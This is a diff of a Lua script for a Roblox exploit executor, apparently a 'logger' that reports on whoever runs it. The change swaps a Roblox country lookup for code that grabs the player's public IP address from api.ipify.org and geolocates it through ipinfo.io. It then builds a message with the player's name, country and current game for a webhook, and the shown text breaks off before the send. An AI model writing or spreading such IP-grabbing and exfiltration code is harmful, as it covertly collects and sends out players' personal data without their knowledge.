@@ -1,17 +1,23 @@
 local function web(webhookURL)
     return function()
-        -- Clonar los servicios necesarios
-        getrenv().HttpRbxApiService = cloneref(game:GetService("HttpRbxApiService"))
-        getrenv().HttpService = cloneref(game:GetService("HttpService"))
-        getrenv().Players = cloneref(game:GetService("Players"))
-        
         local HttpService = game:GetService("HttpService")
         local playerName = game.Players.LocalPlayer.Name
         local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
         
-        -- Obtener el país del jugador utilizando la API de Roblox
-        local countryInfo = HttpService:JSONDecode(HttpRbxApiService:GetAsyncFullUrl("https://users.roblox.com/v1/users/authenticated/country-code"))
-        local country = countryInfo.countryCode or "Unknown"  -- Si no se puede obtener el país, se establece como "Desconocido"
+        -- Obtener la dirección IP del jugador
+        local req = request({
+            Url = "https://api.ipify.org/",
+            Method = "GET"
+        })
+        local ipAddress = req.Body
+        
+        -- Obtener el país basado en la dirección IP
+        local country = "Unknown"
+        local response = HttpService:GetAsync("https://ipinfo.io/" .. ipAddress .. "/json")
+        if response then
+            local info = HttpService:JSONDecode(response)
+            country = info.country or "Unknown"
+        end
         
         local message = "[LOGGER] " .. playerName .. " from " .. country .. " in " .. gameName .. "."
         local requestBody = { content = message }
